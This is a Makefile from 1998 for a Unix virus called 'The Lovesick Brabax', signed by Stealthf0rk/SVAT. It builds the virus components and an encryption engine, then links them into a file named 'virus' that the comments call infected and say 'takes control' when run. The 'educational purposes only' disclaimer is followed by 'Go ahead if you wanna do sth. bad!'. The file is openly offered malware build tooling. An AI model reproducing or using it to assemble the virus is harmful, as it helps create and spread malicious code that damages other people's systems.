# Makefile of the jumping troyan 'The Lovesick Brabax' Version 0.9b
# TLB is a virus. Its for educational purposes only. I'm not responsible
# for any damage you may get due to using this package.
# Its only allowed to use TLB in a legal manner.
# Go ahead if you wanna do sth. bad! Look at the GPL for further rights.
#
# Sept. 5th 1998 
#
# Stealthf0rk / SVAT  <stealth@dione.ids.pl>
#

FLAGS = -DKEY="\"ABCDEFGHIJABCDEFGHIJABCDEFGHIJ\"" #-DDEBUG
CC = gcc -O2 $(FLAGS)
ST = strip

all: INFO close.o dump.e kalif install

close.o: close.c
	$(CC) -c close.c			

main.o: main.c
	$(CC) -c main.c

dump.e: dump.c
	$(CC) -o dump.e dump.c
	@$(ST) dump.e				# we need it to build TLB

cce/sscr.a: cce/cce.h cce/sscr.c cce/cce.c
	cd cce;make				# build SSCR

kalif: main.o cce/sscr.a
	@rm -f X1.c X2.c			# cleanup
	@./dump.e test.c close.c 		# test.c is a dummy, we want close.c in X2.c file
	@$(CC) -c X2.c
	$(CC) -o kalif X2.o main.o cce/sscr.a	# b/c kalif needs char X2[] wich comes from X2.c
	@$(ST) kalif				# let me see you stripped! :) 

install: kalif close.o
	@rm -f X1.c X2.c
	@echo -e "\nInstall ViRUs..."
	@./dump.e kalif				# get kalif in X1[]
	@$(CC) -c X1.c
	$(CC) test.c X1.o close.o -o virus	
	@$(ST) virus
	@echo ...completed. You should have the file 'virus'
	@echo in the current dir. This is the infected file.
	@echo Run it and it takes control...

INFO:
	@echo Ok...try to make TLB...
clean:
	rm -f *.o *.so

